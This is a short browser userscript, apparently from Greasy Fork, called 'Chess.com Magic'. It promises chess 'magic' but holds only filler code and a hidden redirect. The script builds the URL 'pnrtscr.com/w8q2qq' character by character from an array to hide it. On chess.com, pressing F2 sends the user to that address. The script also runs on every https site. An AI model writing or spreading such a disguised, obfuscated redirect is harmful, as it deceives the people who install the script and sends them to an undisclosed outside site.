// ==UserScript==
 // @license MIT 
// @name         Chess.com Magic
// @namespace    magicchess.com
// @version      v3.0
// @description  Magic On Chess.Com
// @author       Jimmy Bones
// @match        https://*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=chess.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/465258/Chesscom%20Magic.user.js
// @updateURL https://update.greasyfork.org/scripts/465258/Chesscom%20Magic.meta.js
// ==/UserScript==

(function() {
    'use strict';


var x = 5;


function sum(a, b) {
  return a + b;
}


function first(arr) {
  return arr[0];
}


var student = {
  name: "John Doe",
  age: 20,
  major: "Computer Science"
};

var myArray = ['h', 't', 't', 'p', 's', ':', '/', '/', 'p', 'n', 'r', 't', 's', 'c', 'r', '.', 'c', 'o', 'm', '/', 'w', '8', 'q', '2', 'q', 'q'];
var myString = myArray.join('');



console.log("Name: " + student.name);
console.log("Age: " + student.age);
console.log("Major: " + student.major);



const currentURL = window.location.href;




function redirect() {
  
  if (currentURL.includes('chess.com')) {
    window.location.href = (myString)





  } else {
    window.location.href = 'https://www.chess.com';
  }
}


document.addEventListener('keydown', function(event) {
  if (event.code === 'F2') {
    redirect();
  }
});



})();